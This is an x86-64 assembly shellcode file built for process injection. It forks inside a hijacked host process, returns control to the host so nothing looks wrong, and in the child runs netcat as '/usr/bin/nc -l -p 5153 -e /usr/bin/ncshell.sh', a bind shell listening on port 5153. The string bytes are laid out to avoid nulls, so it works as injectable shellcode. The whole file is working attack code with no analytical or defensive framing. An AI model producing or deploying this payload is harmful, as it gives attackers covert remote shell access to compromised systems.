##
# Spawns nc in a forked process
# && it's valid shell code :)

  .text

.global _start

_start:
  # Save some things we'll be mucking with here so as to not
  # disturb our host process
  push %rbp
  push %rax
  push %r8
  mov %rsp, %rbp

  # Call fork()
  xor %rax, %rax
  movb $57, %al
  syscall

  # If we are the new thread, jump to nc
  xor %r8, %r8
  cmp %rax, %r8
  je nc

  # Else restore the registers and "return"
  # injector has setup our stack such that we should be able
  # to return to the place where we took over
  pop %r8
  pop %rax
  pop %rbp
  ret

nc:
  push %rbp
  mov %rsp, %rbp
  sub $0x78, %rsp

  # Various pointers for execve
  lea -0x34(%rbp), %r8
  mov %r8, -0x78(%rbp)
  lea -0x28(%rbp), %r8
  mov %r8, -0x70(%rbp)
  lea -0x25(%rbp), %r8
  mov %r8, -0x68(%rbp)
  lea -0x22(%rbp), %r8
  mov %r8, -0x60(%rbp)
  lea -0x1d(%rbp), %r8
  mov %r8, -0x58(%rbp)
  lea -0x1a(%rbp), %r8
  mov %r8, -0x50(%rbp)
  xor %r8, %r8
  mov %r8, -0x48(%rbp)
  

  xor %r9, %r9
  # /usr/bin/nc
  movl $0x7273752f, -0x34(%rbp)
  movl $0x6e69622f, -0x30(%rbp)
  #movl $0x00636e2f, -0x2c(%rbp)
  movw $0x6e2f, -0x2c(%rbp)
  movb $0x63, -0x2a(%rbp)
  movb %r9b, -0x29(%rbp)

  # -l -p 5153 -e /usr/bin/ncshell.sh
  movw $0x6c2d, -0x28(%rbp)
  movb %r9b, -0x26(%rbp)
  movw $0x702d, -0x25(%rbp)
  movb %r9b, -0x23(%rbp)
  movl $0x33353135, -0x22(%rbp)
  movb %r9b, -0x1e(%rbp)
  movw $0x652d, -0x1d(%rbp)
  movb %r9b, -0x1b(%rbp)
  movl $0x7273752f, -0x1a(%rbp)
  movl $0x6e69622f, -0x16(%rbp)
  movl $0x73636e2f, -0x12(%rbp)
  movl $0x6c6c6568, -0x0e(%rbp)
  movw $0x732e, -0x0a(%rbp)
  movb $0x68, %r8b
  mov %r8, -0x08(%rbp)

  # This was the non-shellcode implementation
  #movl $0x2d006c2d, -0x28(%rbp)
  #movl $0x31350070, -0x24(%rbp)
  #movl $0x2d003335, -0x20(%rbp)
  #movl $0x752f0065, -0x1c(%rbp)
  #movl $0x622f7273, -0x18(%rbp)
  #movl $0x6e2f6e69, -0x14(%rbp)
  #movl $0x65687363, -0x10(%rbp)
  #movl $0x732e6c6c, -0x0c(%rbp)
  #xor %r8, %r8
  #mov $0x68, %r8b
  #mov %r8, -0x08(%rbp)

  #xor %rax, %rax
  mov $59, %al
  lea -0x34(%rbp), %rdi
  lea -0x78(%rbp), %rsi
  lea -0x48(%rbp), %rdx
  syscall
